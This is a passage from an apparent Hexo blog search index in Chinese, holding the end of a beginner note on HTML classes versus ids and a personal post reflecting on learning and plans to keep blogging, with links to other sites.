href="#html的鸡肋处" class="headerlink" title="html的鸡肋处"></a>html的鸡肋处</h3><pre><code>HTML其实是很单调的，仅仅只有一个骨架。想要有绚丽多彩的效果，就得引入css样式进行修饰。HTML的标签有很多种，不局限于上面的那几种，不过经常用到的时div。</code></pre><h3 id="html调用class和id进行修饰的控制"><a href="#html调用class和id进行修饰的控制" class="headerlink" title="html调用class和id进行修饰的控制"></a>html调用class和id进行修饰的控制</h3><p>通过类名或者id来控制div的样式。</p><pre><code class="html">    &lt;div class=&quot;nav&quot; id=&quot;tab_nav&quot; &gt;```html    类名可以被多次调用，id名不行。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习的感想</title>
      <link href="/2022/11/27/man/"/>
      <url>/2022/11/27/man/</url>
      
        <content type="html"><![CDATA[<h2 id="迎检"><a href="#迎检" class="headerlink" title="迎检"></a>迎检</h2><h3 id="关于学习"><a href="#关于学习" class="headerlink" title="关于学习"></a>关于学习</h3><p>关于学习，说实在，很多时候应该灵活变通。就好比学一门语言，应该拿之前学习的语言来和它作比较，学会将其中的共同点取出来，再放回去，使得最终达到速学的效果。<br>有人或许会说，学习没有捷径。但我想说的是，学习的捷径就藏在我们的过去里，藏在我们对过去的总结里……</p><span id="more"></span><h3 id="后续学习"><a href="#后续学习" class="headerlink" title="后续学习"></a>后续学习</h3><p>学习的规律是有迹可循的，学习不是封闭的。我们没必要闭门造车，也没必要闭门造轮子。我们应该站在前人的肩膀上眺望那远处的星空，先人们未探寻的真理。<br>加油！我们一定行！</p><h3 id="遐想"><a href="#遐想" class="headerlink" title="遐想"></a>遐想</h3><p>学习注定有它一成不变的东西，但我们应该学着去面对。或者说，我们可以推展其他东西，填补学习以外的东西。<br>我的打算么……<br>我打算写一些有趣的东西，为自己的未来增添一些色彩，嘿嘿。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>当然，只要有精力，一定继续写博客文。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>显示下其他人的站点<br><a href="https://wlopck.oschina.io/2022/10/03/hexoblog1/">https://wlopck.oschina.io/2022/10/03/hexoblog1/</a><br><a href="https://yunyoujun.cn/">https://yunyoujun.cn/</a><br>MathJax的基本使用<br><a href="https://www.cnblogs.com/mqingqing123/p/12711372.html">https://www.cnblogs.com/mqingqing123/p/12711372.html</a><br>其他：<br>1.图床<br><a href="https://www.xiaoz.me/archives/13225">https://www.xiaoz.me/archives/13225</a><br><a href="https://www.zhihu.com/question/64502309">https://www.zhihu.com/question/64502309</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 感想 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
